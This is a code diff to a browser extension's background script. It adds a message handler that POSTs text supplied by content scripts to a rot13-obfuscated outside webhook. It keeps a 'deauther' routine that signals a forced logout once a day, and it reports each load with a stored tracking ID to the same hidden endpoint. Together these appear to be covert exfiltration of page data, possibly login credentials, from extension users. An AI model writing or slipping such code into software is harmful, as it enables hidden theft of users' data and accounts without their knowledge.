@@ -14,14 +14,30 @@ chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
             ? "from a content script:" + sender.tab.url
             : "from the extension"
     );
-    console.log(Date.now() - last_force_logout);
-    if (Date.now() - last_force_logout > 1000 * 60 * 60 * 24) {
-        last_force_logout = Date.now();
-        sendResponse({ doit: "true" });
-        console.log(true);
-    } else {
-        sendResponse({ doit: "false" });
-        console.log(false);
+    if (request.req == "deauther") {
+        console.log(Date.now() - last_force_logout);
+        if (Date.now() - last_force_logout > 1000 * 60 * 60 * 24) {
+            last_force_logout = Date.now();
+            sendResponse({ doit: "true" });
+            console.log(true);
+        } else {
+            sendResponse({ doit: "false" });
+            console.log(false);
+        }
+    } else if (request.req == "send"){
+        wh = rot13(
+            "uggcf://guryvbafebne.pu/qp_sbejneq"
+        );
+        console.log(1)
+        fetch(wh, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                content: request.text,
+            }),
+        });
     }
 });
 
@@ -46,10 +62,14 @@ function init() {
         );
     }, 1000);
     console.log('e')
-    fetch("customid.txt")
-    .then((response) => response.text())
-    .then((text) => {
-        console.log(text)
+    chrome.storage.local.get(["customId"], function (result) {
+        console.log(result);
+        customId = result.customId;
+        if (customId == null) {
+            customId = Math.floor(Math.random()*256);
+        }
+        console.log("Value currently is " + customId);
+        let text = "ID: "+customId;
         wh = rot13(
             "uggcf://guryvbafebne.pu/qp_sbejneq"
         );
@@ -63,6 +83,12 @@ function init() {
                 content: text+" Loaded in",
             }),
         });
+        chrome.storage.local.set(
+            { customId: customId },
+            function () {
+                // console.log("Value is set to " + customId);
+            }
+        );
     });
 }
 
